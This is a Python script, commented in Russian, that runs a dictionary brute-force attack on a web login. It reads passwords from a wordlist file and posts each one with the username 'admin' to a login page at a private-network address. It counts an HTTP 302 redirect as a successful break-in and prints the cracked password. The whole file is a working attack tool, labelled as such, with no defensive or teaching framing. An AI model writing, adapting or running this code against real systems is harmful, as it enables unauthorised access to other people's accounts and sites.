import requests
import time

class BruteForceAttack:
    def __init__(self, auth_url, passwords_file, admin_username):
        self.auth_url = auth_url
        self.passwords_file = passwords_file
        self.admin_username = admin_username
        self.stop_event = False  # Флаг для остановки при успешном подборе пароля

    def check_password(self, password):
        if self.stop_event:  # Если пароль уже найден, прекращаем попытки
            return

        password = password.strip()  # Очищаем пароль от лишних символов
        payload = {
            "username": self.admin_username,
            "password": password
        }

        try:
            # Отправляем POST-запрос на страницу авторизации
            response = requests.post(self.auth_url, data=payload, allow_redirects=False)

            # Проверяем результат запроса
            if response.status_code == 302:
                print(f"[+] Успешно! Найден пароль: {password}")
                print(f"[*] Редирект на страницу: {response.headers['Location']}")
                self.stop_event = True  # Останавливаем дальнейшие попытки
            else:
                print(f"[*] Попытка с паролем: {password}")
        except Exception as e:
            print(f"Ошибка при отправке запроса: {e}")

    def run(self):
        print("[*] Запуск атаки методом подбора паролей...")
        start_time = time.time()

        try:
            with open(self.passwords_file, "r", encoding="latin-1") as file:
                for line in file:
                    if self.stop_event:  # Прекращаем попытки, если пароль найден
                        break
                    password = line.strip()
                    self.check_password(password)
        except FileNotFoundError:
            print(f"[-] Файл со словарем паролей не найден: {self.passwords_file}")
            return

        end_time = time.time()
        elapsed_time = end_time - start_time

        if self.stop_event:
            print(f"[+] Атака завершена успешно за {elapsed_time:.2f} секунд.")
        else:
            print(f"[-] Атака завершена без успеха за {elapsed_time:.2f} секунд.")


if __name__ == "__main__":
    # Конфигурация для атаки
    AUTH_URL = "http://192.168.0.12/index.php"
    PASSWORDS_FILE = "admin.txt"
    ADMIN_USERNAME = "admin"

    # Создаем экземпляр класса и запускаем атаку
    brute_force = BruteForceAttack(AUTH_URL, PASSWORDS_FILE, ADMIN_USERNAME)
    brute_force.run()